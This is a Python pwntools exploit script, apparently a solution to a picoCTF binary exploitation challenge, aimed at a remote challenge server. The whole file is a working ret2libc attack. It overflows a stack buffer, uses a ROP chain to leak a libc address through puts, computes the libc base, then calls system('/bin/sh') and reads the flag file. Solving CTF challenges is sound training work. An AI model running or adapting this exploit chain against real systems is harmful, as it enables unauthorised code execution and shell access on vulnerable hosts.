#!/usr/bin/env python3

from pwn import *

context.binary = binary = './vuln'

vuln_elf = ELF(binary)
libc = ELF('./libc.so.6')

vuln_rop = ROP(vuln_elf)

#p = process('./vuln')
p = remote("mercury.picoctf.net", 1774)

padding = b'A' * 136

payload = padding

payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(vuln_elf.got.setbuf)
payload += p64(vuln_elf.plt.puts)
payload += p64(vuln_elf.symbols.main)

p.sendlineafter('VeR!', payload)
p.recvuntil('AAAd\n')

leak = u64(p.recvline().strip().ljust(8, b'\0'))
log.info(f'{hex(leak)}')

libc.address = leak - libc.symbols.setbuf
log.info(f'Libc base => {hex(libc.address)}')

payload = padding

payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(vuln_rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)
p.sendline('cat flag.txt')

p.interactive()